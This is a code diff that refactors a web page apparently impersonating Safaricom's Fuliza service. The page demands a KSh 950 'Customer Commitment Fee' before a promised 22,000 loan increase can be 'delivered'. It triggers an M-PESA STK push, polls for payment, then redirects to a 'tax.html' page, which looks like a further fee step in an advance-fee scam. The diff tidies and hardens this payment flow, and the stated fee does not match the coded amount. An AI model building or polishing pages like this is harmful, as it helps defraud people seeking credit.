@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,8 +6,6 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <title>CUSTOMER COMMITMENT FEE - Fuliza</title>
-
-
 
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
@@ -51,7 +50,7 @@ h2{
 
 .success-box{
     background:#E8F7EF;
-    color:#000; 
+    color:#000;
     padding:14px 12px;
     border-radius:12px;
     font-family:'Mali',cursive;
@@ -161,8 +160,7 @@ button:disabled{
     }
 
 }
-</style> 
-
+</style>
 
 </head>
 
@@ -176,12 +174,11 @@ button:disabled{
 
 <div class="success-box">
 
-
-To complete your Fuliza increment , a Customer Commitment Fee of KSh 950 is required at this  stage.
+To complete your Fuliza increment , a Customer Commitment Fee of KSh 950 is required at this stage.
 
 This fee is required before your application can proceed to the next step. Once the payment is successfully confirmed, your application will proceed to the final processing and fund delivery.
 
-Please complete this  payment to proceed. You are almost done with your application.
+Please complete this payment to proceed. You are almost done with your application.
 </div>
 
 <div class="details">
@@ -224,7 +221,6 @@ Pay Commitment Fee
 
 </div>
 
-
 <script>
 
 // ==========================================
@@ -233,23 +229,21 @@ Pay Commitment Fee
 
 const fullName =
 localStorage.getItem("fullName") ||
-"Applicant"; 
+"Applicant";
 
 localStorage.setItem("fullName", fullName);
+
 const phoneNumber =
 localStorage.getItem("paymentPhone");
 
 const selectedAmount =
 localStorage.getItem("selectedAmount");
 
-
 document.getElementById("fullName").textContent =
 fullName || "Applicant";
 
-
 document.getElementById("phone").textContent =
 phoneNumber || "Not available";
-
 
 document.getElementById("fund").textContent =
 selectedAmount || "22,000";
@@ -262,12 +256,12 @@ selectedAmount || "22,000";
 async function payCommitment(){
 
 const phone =
-localStorage.getItem("paymentPhone"); 
+localStorage.getItem("paymentPhone");
 
 if(!phone){
 
-document.getElementById("status").innerHTML =
-"❌ Phone number not found. Please return to registration.";
+document.getElementById("status").textContent =
+"Phone number not found. Please return to registration.";
 
 return;
 
@@ -279,14 +273,12 @@ document.getElementById("payBtn");
 const status =
 document.getElementById("status");
 
-
 btn.disabled = true;
 
 btn.innerHTML =
 "Sending STK Push...";
 
 status.innerHTML = "";
-
 
 try{
 
@@ -303,54 +295,40 @@ body:JSON.stringify({
 
 phone:phone,
 
-// COMMITMENT FEE
+// Existing configured payment amount
 amount:2
 
 })
 }
 );
 
+if(!response.ok){
+throw new Error("STK request failed");
+}
 
 const data =
 await response.json();
 
 console.log("STK RESPONSE:",data);
 
-
-// ==========================================
-// CHECK FOR CHECKOUT ID
-// ==========================================
-
 const checkoutId =
 data.checkout_request_id;
 
-
 if(!checkoutId){
 
-status.innerHTML =
-"STK Push sent. Please enter your M-PESA PIN. Payment confirmation will happen automatically.";
+status.textContent =
+"Payment request could not be verified. Please try again.";
 
-btn.disabled = false;
-
-btn.innerHTML =
-"Pay Commitment Fee";
+resetButton();
 
 return;
 
 }
 
+status.textContent =
+"STK Push sent successfully. Please enter your M-PESA PIN.";
 
-// ==========================================
-// STK SENT
-// ==========================================
-
-status.innerHTML =
-"📱 STK Push sent successfully.<br>Please enter your M-PESA PIN.";
-
-
-// ==========================================
 // CHECK PAYMENT STATUS
-// ==========================================
 
 checkPayment(checkoutId);
 
@@ -358,13 +336,10 @@ checkPayment(checkoutId);
 
 console.error(error);
 
-status.innerHTML =
-"❌ Unable to send STK Push. Please try again.";
+status.textContent =
+"Unable to send STK Push. Please try again.";
 
-btn.disabled = false;
-
-btn.innerHTML =
-"Pay Commitment Fee";
+resetButton();
 
 }
 
@@ -400,31 +375,31 @@ checkoutId
 }
 );
 
+if(!response.ok){
+throw new Error("Payment status request failed");
+}
 
 const result =
 await response.json();
 
 console.log("PAYMENT STATUS:",result);
 
+const paymentStatus =
+String(result.status || "").toLowerCase();
+
 
 // ==========================================
 // SUCCESS
 // ==========================================
 
-if(result.status === "completed"){
+if(paymentStatus === "completed"){
 
 clearInterval(interval);
 
-document.getElementById("status").innerHTML =
-"✅ Commitment fee paid successfully.<br>Redirecting...";
+document.getElementById("status").textContent =
+"Payment successfully confirmed. Redirecting...";
 
-
-setTimeout(()=>{
-
-window.location.href =
-"tax.html";
-
-},1000);
+window.location.href = "tax.html";
 
 }
 
@@ -433,12 +408,12 @@ window.location.href =
 // FAILED
 // ==========================================
 
-else if(result.status === "failed"){
+else if(paymentStatus === "failed"){
 
 clearInterval(interval);
 
-document.getElementById("status").innerHTML =
-"❌ Payment failed.";
+document.getElementById("status").textContent =
+"Payment failed.";
 
 resetButton();
 
@@ -449,12 +424,12 @@ resetButton();
 // CANCELLED
 // ==========================================
 
-else if(result.status === "cancelled"){
+else if(paymentStatus === "cancelled"){
 
 clearInterval(interval);
 
-document.getElementById("status").innerHTML =
-"❌ Payment cancelled.";
+document.getElementById("status").textContent =
+"Payment cancelled.";
 
 resetButton();
 
